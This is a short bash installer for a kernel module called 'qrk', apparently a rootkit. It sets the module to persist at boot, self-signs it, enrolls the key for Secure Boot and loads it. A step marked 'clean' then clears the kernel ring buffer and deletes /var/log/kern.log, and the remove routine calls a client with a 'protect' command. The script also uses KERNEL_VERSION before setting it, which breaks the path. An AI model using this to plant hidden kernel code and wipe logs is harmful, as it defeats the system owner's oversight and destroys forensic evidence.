#!/bin/bash
DRIVER="qrk"
DRIVER_DIRECTORY="/lib/modules/$KERNEL_VERSION/kernel/net/$DRIVER"
# ------------------------------- CONFIG --------------------------------

KERNEL_VERSION=$(uname -r)
LOAD_PATH="/etc/modules-load.d/$DRIVER.conf"
SIGN_FILE_PATH="/lib/modules/$KERNEL_VERSION/build/scripts/sign-file"

function install_qrk {
    if [ ! -d $DRIVER_DIRECTORY ]
    then
        mkdir -p $DRIVER_DIRECTORY
    fi

    strip --strip-debug "$PWD/$DRIVER.ko"
    cp "$PWD/$DRIVER.ko" "$DRIVER_DIRECTORY"
    echo "$DRIVER" > $LOAD_PATH

    # should reboot
    openssl req -new -nodes -utf8 -sha512 -days 36500 -batch -x509 -config x509.genkey -outform DER -out $DRIVER_DIRECTORY/signing_key.x509 -keyout $DRIVER_DIRECTORY/signing_key.priv
    $SIGN_FILE_PATH sha512 $DRIVER_DIRECTORY/signing_key.priv $DRIVER_DIRECTORY/signing_key.x509 $DRIVER_DIRECTORY/$DRIVER.ko
    mokutil --import $DRIVER_DIRECTORY/signing_key.x509
    
    depmod
    insmod "$DRIVER_DIRECTORY/$DRIVER.ko"
    
    # clean
    dmesg -c
    rm /var/log/kern.log
}

function remove_qrk {
    python3 client.py protect 127.0.0.1 0
    rmmod $DRIVER.ko
    rm -rf $DRIVER_DIRECTORY
    rm -rf $LOAD_PATH
    depmod
}

case $1 in
    install)
        install_qrk
        ;;
    remove)
        remove_qrk
        ;;
esac